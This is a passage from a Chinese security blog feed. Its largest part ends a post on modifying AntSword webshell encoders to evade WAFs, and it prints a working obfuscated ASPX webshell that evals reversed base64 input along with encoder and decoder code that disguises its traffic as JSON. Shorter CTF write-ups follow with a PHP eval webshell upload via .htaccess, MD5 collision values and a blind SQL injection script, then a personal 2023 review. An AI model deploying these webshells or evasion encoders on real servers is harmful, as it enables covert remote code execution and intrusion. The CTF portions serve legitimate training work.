&quot;+err.message));&#125;Response.Write(&quot;ff68c&quot;+&quot;cb5923&quot;);Response.End();&amp;g8e91c2df20b34=dx&amp;h93ed200859da2=KLY2QgL2QgIkM6XFxhc3BcXGFzcHgiJmRpciZlY2hvIDM2MDhiOSZjZCZlY2hvIDA4OTNiNDFlZTA5&amp;u4e84622c91c5d=oZY21k</span><br></pre></td></tr></table></figure><p>这里就可以看到，将我们的定义的函数放到参数中了，和php实现原理差不多。<br><img src="/images/antsword-bypasswaf/image-20240407163002950.png" alt="image-20240407163002950"></p><p><img src="/images/antsword-bypasswaf/image-20240407163017550.png" alt="image-20240407163017550"></p><p>显示也没有问题。<br><img src="/images/antsword-bypasswaf/image-20240407163102149.png" alt="image-20240407163102149"></p><p>但是我们的双击进行目录查看的时候，或者看文件内容就不行。<br>是要把所有的功能点，要加上asenc函数。这里就不一一替换了。<br>直接下载我的项目或者替换aspx文件夹就好了。<br>或者这个大师傅的<a href="https://github.com/youncyb/AS_ASPX_AES_ENCODE/tree/main/aspx">https://github.com/youncyb/AS_ASPX_AES_ENCODE/tree/main/aspx</a><br>我也是照着大师傅改的<br>接下来就是伪装了成json了,顺便在进行逆序</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64解码器</span></span><br><span class="line"><span class="comment"> * Create at: 2024/04/07 09:56:32</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>asenc 将返回数据base64编码</span></span><br><span class="line"><span class="comment">   * 自定义输出函数名称必须为 asenc</span></span><br><span class="line"><span class="comment">   * 该函数使用的语法需要和shell保持一致</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">asoutput</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`function asenc(opcode)&#123;</span></span><br><span class="line"><span class="string">    var bytesToEncode = System.Text.Encoding.UTF8.GetBytes(opcode);</span></span><br><span class="line"><span class="string">var data = System.Convert.ToBase64String(bytesToEncode).split(&#x27;&#x27;).reverse().join(&#x27;&#x27;);</span></span><br><span class="line"><span class="string">var data1 = &#x27;&#123;&quot;message&quot;:&quot;&#x27;;</span></span><br><span class="line"><span class="string">var data2 = &#x27;&quot;&#125;&#x27;</span></span><br><span class="line"><span class="string">var z = data1+data+data2;</span></span><br><span class="line"><span class="string">return z;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">    `</span>.replace(<span class="regexp">/\n\s+/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 解码 Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param <span class="type">&#123;string&#125;</span> </span>data 要被解码的 Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>解码后的 Buffer</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">decode_buff</span>: <span class="function">(<span class="params">data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> res = Buffer.from(data.toString().replace(<span class="regexp">/&#123;&quot;message&quot;:&quot;/g</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="regexp">/&quot;&#125;/g</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">   </span><br><span class="line">     <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是拼接一下输出即可，下面给data替换回来。</p><p><img src="/images/antsword-bypasswaf/image-20240408091907690.png" alt="image-20240408091907690"></p><p>然后再将这里的分隔符直接注释掉，替换为空。<br>重启一下，看下效果</p><p><img src="/images/antsword-bypasswaf/image-20240408092047540.png" alt="image-20240408092047540"></p><p>emmm。nice。</p><p>记一下代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">var</span> a=<span class="string">&#x27;efasnu&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> c=a(<span class="number">5</span>)+a(<span class="number">4</span>)+a(<span class="number">3</span>)+a(<span class="number">2</span>)+a(<span class="number">1</span>)+a(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> c = Request.Item[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="keyword">var</span> data = c.split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bytes = System.Convert.FromBase64String(data);</span><br><span class="line"><span class="keyword">var</span> decodedText = System.Text.Encoding.UTF8.GetString(bytes);</span><br><span class="line"><span class="built_in">eval</span>(decodedText,c);</span><br><span class="line">&#125; <span class="keyword">catch</span> (ex) &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">编码器</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * aspx::base64编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2024/04/07 14:12:58</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  data[pwd] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="comment">// shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span></span><br><span class="line">  <span class="comment">//data[pwd] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;);</span></span><br><span class="line">  <span class="comment">// ##########    请在上方编写你自己的代码   ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 删除 _ 原有的payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// 返回编码器处理后的 payload 数组</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">解码器</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64解码器</span></span><br><span class="line"><span class="comment"> * Create at: 2024/04/07 09:56:32</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>asenc 将返回数据base64编码</span></span><br><span class="line"><span class="comment">   * 自定义输出函数名称必须为 asenc</span></span><br><span class="line"><span class="comment">   * 该函数使用的语法需要和shell保持一致</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">asoutput</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`function asenc(opcode)&#123;</span></span><br><span class="line"><span class="string">    var bytesToEncode = System.Text.Encoding.UTF8.GetBytes(opcode);</span></span><br><span class="line"><span class="string">var data = System.Convert.ToBase64String(bytesToEncode).split(&#x27;&#x27;).reverse().join(&#x27;&#x27;);</span></span><br><span class="line"><span class="string">var data1 = &#x27;&#123;&quot;message&quot;:&quot;&#x27;;</span></span><br><span class="line"><span class="string">var data2 = &#x27;&quot;&#125;&#x27;</span></span><br><span class="line"><span class="string">var z = data1+data+data2;</span></span><br><span class="line"><span class="string">return z;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">    `</span>.replace(<span class="regexp">/\n\s+/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 解码 Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param <span class="type">&#123;string&#125;</span> </span>data 要被解码的 Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>解码后的 Buffer</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">decode_buff</span>: <span class="function">(<span class="params">data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> res = Buffer.from(data.toString().replace(<span class="regexp">/&#123;&quot;message&quot;:&quot;/g</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="regexp">/&quot;&#125;/g</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">   </span><br><span class="line">     <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="致谢r"><a href="#致谢r" class="headerlink" title="致谢r"></a>致谢r</h4><p>最后感谢您读到现在，这篇文章匆忙构成肯定有错误到或描述不正确的地方，期待业界师傅们指正勘误。</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">https://yzddmr6.com/posts/antsword-diy-2/</span><br><span class="line">https://darkless.cn/2020/05/19/antsword-bypass-waf#bypass%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C</span><br><span class="line">https://xz.aliyun.com/t/7736?time__1311=n4%2BxnD0G0%3DKWwqYu405%2BbFYituY5DvP5DkeD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Fu%2F31536</span><br><span class="line">https://xz.aliyun.com/t/7735?time__1311=n4%2BxnD0G0%3DKWwqYqD5DsA3OhDge1KdDuit%3DoD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Fu%2F31536</span><br><span class="line">https://www.secpulse.com/archives/192415.html</span><br><span class="line">https://github.com/AntSwordProject/antSword/</span><br><span class="line">https://xz.aliyun.com/t/6701?time__1311=n4%2BxnD0DRDyDg7WtG%3DD%2Fia4qgWG8QD0rr278bD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6</span><br><span class="line">https://sec.lz520520.com/2020/05/427/#0x02_UI</span><br><span class="line">https://xz.aliyun.com/t/6917?time__1311=n4%2BxnD0DRDyD9iDgGDcDBqOoQWjr1QCiD0rrD</span><br><span class="line">https://xz.aliyun.com/t/6571?time__1311=n4%2BxnD0DRDBAi%3DDk%2BNDsA3xCq4mwbTRGgD7Kx</span><br><span class="line">https://mp.weixin.qq.com/s/ai3dW8H_ZnlFMPo-pgoqZw</span><br><span class="line">https://github.com/yzddmr6/JspForAntSword/tree/master</span><br><span class="line">https://xz.aliyun.com/t/6701?time__1311=n4%2BxnD0DRDyDg7WtG%3DD%2Fia4qgDBGDfx7IvY5x&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F7736%3Ftime__1311%3Dn4%252BxnD0G0%253DKWwqYu405%252BbFYitDCiKdtYrYe4D%26alichlgref%3Dhttps%253A%252F%252Fxz.aliyun.com%252Fu%252F31536#toc-5  从0到1打造一款堪称完美antSword(蚁剑)</span><br><span class="line">https://www.cnblogs.com/LittleHann/p/5016999.html</span><br><span class="line">https://www.youncyb.cn/?p=700</span><br><span class="line">https://xz.aliyun.com/u/31536</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nssctfweb刷题记录</title>
      <link href="/2024/02/23/nssctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/nssctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/02/23/nssctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/nssctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p><img src="D:\myBlog\source\images\nssctfweb刷题记录\image-20240223135432801.png" alt="image-20240223135432801"></p><h5 id="GDOUCTF-2023-泄露的伪装"><a href="#GDOUCTF-2023-泄露的伪装" class="headerlink" title="[GDOUCTF 2023]泄露的伪装"></a>[GDOUCTF 2023]泄露的伪装</h5><p><img src="D:\myBlog\source\images\nssctfweb刷题记录\image-20240223140312152-17086682339191.png" alt="image-20240223140312152"></p><p>orzorz.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cxk</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(file_get_contents(<span class="variable">$cxk</span>)==<span class="string">&quot;ctrl&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;洗洗睡吧&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nononoononoonono&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> nononoononoonono</span><br></pre></td></tr></table></figure><p><a href="http://node5.anna.nssctf.cn:28206/orzorz.php?cxk=data://text/plain,ctrl">http://node5.anna.nssctf.cn:28206/orzorz.php?cxk=data://text/plain,ctrl</a></p><h5 id="NISACTF-2022-level-up"><a href="#NISACTF-2022-level-up" class="headerlink" title="[NISACTF 2022]level-up"></a>[NISACTF 2022]level-up</h5><p>robots里</p><p>md5强碰撞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;array2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>sha1强碰撞</p><h5 id="SWPUCTF-2021-新生赛-easyupload3-0"><a href="#SWPUCTF-2021-新生赛-easyupload3-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload3.0"></a>[SWPUCTF 2021 新生赛]easyupload3.0</h5><p>先</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name=&quot;uploaded&quot;; filename=&quot;.htaccess&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name=&quot;uploaded&quot;; filename=&quot;1.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&#x27;a&#x27;]);phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h5 id="SWPUCTF-2021-新生赛-error"><a href="#SWPUCTF-2021-新生赛-error" class="headerlink" title="[SWPUCTF 2021 新生赛]error"></a>[SWPUCTF 2021 新生赛]error</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://node4.anna.nssctf.cn:28666/index.php?id=1&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bool_sql_database_name</span>():</span></span><br><span class="line">    <span class="keyword">global</span> url</span><br><span class="line">    flag=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">127</span></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            </span><br><span class="line">            payload = <span class="string">&quot;&#x27; and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&lt;&#123;&#125;,1,0) and &#x27;a&#x27;=&#x27;a&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            <span class="comment">#information_schema,mysql,performance_schema,test,test_db</span></span><br><span class="line">            <span class="comment">#payload = &quot;&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;test&#x27;),&#123;&#125;,1))&lt;&#123;&#125;,1,0) and &#x27;a&#x27;=&#x27;a&quot;.format(i,mid)</span></span><br><span class="line">            <span class="comment">#test_db-&gt;test_tb-&gt;id,flag,users</span></span><br><span class="line">            <span class="comment">#payload = &quot;&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;test_db&#x27; and table_name=&#x27;test_tb&#x27;),&#123;&#125;,1))&lt;&#123;&#125;,1,0) and &#x27;a&#x27;=&#x27;a&quot;.format(i,mid)</span></span><br><span class="line">            <span class="comment">#test_db-&gt;test_tb-&gt;id,flag,users</span></span><br><span class="line">            <span class="comment">#payload = &quot;&#x27; and if(ascii(substr((select flag from test_db.test_tb),&#123;&#125;,1))&lt;&#123;&#125;,1,0) and &#x27;a&#x27;=&#x27;a&quot;.format(i,mid)</span></span><br><span class="line"></span><br><span class="line">            res = requests.get(url + payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;.....&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                high = mid </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                low = mid +<span class="number">1</span></span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid-<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">bool_sql_database_name()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>polarctfre刷题记录</title>
      <link href="/2024/02/23/polarctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/polarctfre%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/02/23/polarctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/polarctfre%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h5 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h5><p>32bit 有upx的壳，解一下</p><p><img src="D:\myBlog\source\images\polarctfre刷题记录\image-20240223112401799.png" alt="image-20240223112401799"></p><p>ida即可 shift+f12</p><h5 id="加加减减"><a href="#加加减减" class="headerlink" title="加加减减"></a>加加减减</h5><p><img src="D:\myBlog\source\images\polarctfre刷题记录\image-20240223134022422.png" alt="image-20240223134022422"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>my2023</title>
      <link href="/2024/02/08/my/my2023/"/>
      <url>/2024/02/08/my/my2023/</url>
      
        <content type="html"><![CDATA[<p>又到了一年一度的总结时候了，转年一年又过去了。时间是过的真快啊。<br>转眼间，大学的生活已经结束了，五年的大学生活，想想这五年的大学生活，好像也没有学到什么知识，但是好像有学到了一些知识。比上不足比下有余吧。</p><p>五年的大学生活，总结下来，就是感谢吧，感谢父亲和姐姐给我钱上大学，没有他们，或许我的大学都不能完成。感谢信安二班帮助过我的同学、以及对我特别照顾的老师们。感谢大数据一班帮助过我的同学们，以及对我特别照顾的老师们并且给我非常重要锻炼自己的机会。当然最重要的还是在大学的最后一年找到一个非常非常优秀的女朋友，陪我走过了最后一年的大学的时光。<br>二月份一个以前hw认识的好朋友，带我参加了cavd2023汽车信息安全春季赛，打到最后也没有打出来什么成果，倒是坐了坐tesla，车挺不错的，就是太贵了。最后大气的中汽研还给了个小米的螺丝刀，感谢大哥带我打比赛，下次我还去。</p><p>接下来就是四月底了，三个好大哥带我去福州打比赛了，哦对了，还有两个非常非常好的老师。那是我人生中第一次坐飞机，说实话其实非常害怕的。尤其是第一次坐的时候，飞机上升的时候，那种腾空的感觉确实不太好受。不过最后成绩还是不错的，或许最后那个溯源在努力努力，能拿个前三名的，但确实最后的不会做了，没办法太菜了。后面分析分析，其实挺简单的，但是比赛的时候确实心态有点崩。感谢李老师和罗老师请我们吃海鲜大餐，也给我讲了许多的，从老师那里也学到了许多，也给我提了许多建议，我都记在心里，慢慢改正。这是最后一次以学生身份参加比赛了。五年的学生生涯里参加了很多比赛，也见识到许多的内幕，有些比赛真的很搞。以后就是以工作的身份参加比赛了，不知道环境会不会好一点，或许更搞。五年的比赛让我学会了，团队的重要性，一个人的能力和时间毕竟是有限的。其实学生的比赛生涯就这么结束还是非常遗憾的，梦想能组一个小团队，去打各种比赛，web，re，pwn，misc，crypto，都有小伙伴，打比赛一叫都来，咔咔咔都能拿下题目，但实际上，到最后就我自己在那苦苦的研究web题，研究完了，比赛也结束了。一句话，贵在坚持。说远了，再次感谢老师和大哥们带我打比赛，贴几张照片。</p><p><img src="/images/my2023/image-20240207162912823.png" alt="image-20240207162912823"></p><p><img src="/images/my2023/image-20240207162931786.png" alt="image-20240207162931786"></p><p><img src="/images/my2023/image-20240207162948355.png" alt="image-20240207162948355"></p><p><img src="/images/my2023/image-20240207163008242.png" alt="image-20240207163008242"></p><p><img src="/images/my2023/image-20240207163026870.png" alt="image-20240207163026870"></p><p><img src="/images/my2023/image-20240207163040470.png" alt="image-20240207163040470"></p><p><img src="/images/my2023/image-20240207163057191.png" alt="image-20240207163057191"></p><p>五月份也代表学校参加了教育的攻防演练。中间也确实发生了一些事情，最后结果是好的就好了 